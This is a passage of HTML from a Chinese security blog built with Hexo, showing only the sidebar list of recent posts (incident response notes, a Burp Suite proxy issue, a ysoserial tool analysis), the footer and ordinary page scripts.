src="/2023/05/06/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AC%94%E8%AE%B0/image-20230509161145970.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows应急响应笔记"/></a><div class="content"><a class="title" href="/2023/05/06/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AC%94%E8%AE%B0/" title="Windows应急响应笔记">Windows应急响应笔记</a><time datetime="2023-05-06T07:48:31.845Z" title="发表于 2023-05-06 15:48:31">2023-05-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/05/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/" title="Linux应急响应笔记"><img src="/2023/05/05/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/image-20230506142107490.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux应急响应笔记"/></a><div class="content"><a class="title" href="/2023/05/05/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/" title="Linux应急响应笔记">Linux应急响应笔记</a><time datetime="2023-05-05T02:07:22.053Z" title="发表于 2023-05-05 10:07:22">2023-05-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/01/burpsuite%E5%9C%A8%E4%BB%A3%E7%90%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E5%B7%A5%E4%BD%9C/" title="burpsuite在代理环境下的问题"><img src="/2023/05/01/burpsuite%E5%9C%A8%E4%BB%A3%E7%90%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E5%B7%A5%E4%BD%9C/image-20230501194008614.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="burpsuite在代理环境下的问题"/></a><div class="content"><a class="title" href="/2023/05/01/burpsuite%E5%9C%A8%E4%BB%A3%E7%90%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E5%B7%A5%E4%BD%9C/" title="burpsuite在代理环境下的问题">burpsuite在代理环境下的问题</a><time datetime="2023-05-01T02:30:33.834Z" title="发表于 2023-05-01 10:30:33">2023-05-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/28/ysoserial%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/" title="ysoserial工具分析"><img src="/2023/04/28/ysoserial%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/ysoserial.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ysoserial工具分析"/></a><div class="content"><a class="title" href="/2023/04/28/ysoserial%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/" title="ysoserial工具分析">ysoserial工具分析</a><time datetime="2023-04-28T06:33:00.000Z" title="发表于 2023-04-28 14:33:00">2023-04-28</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Mlins</div><div class="framework-info"><span>Framework - </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
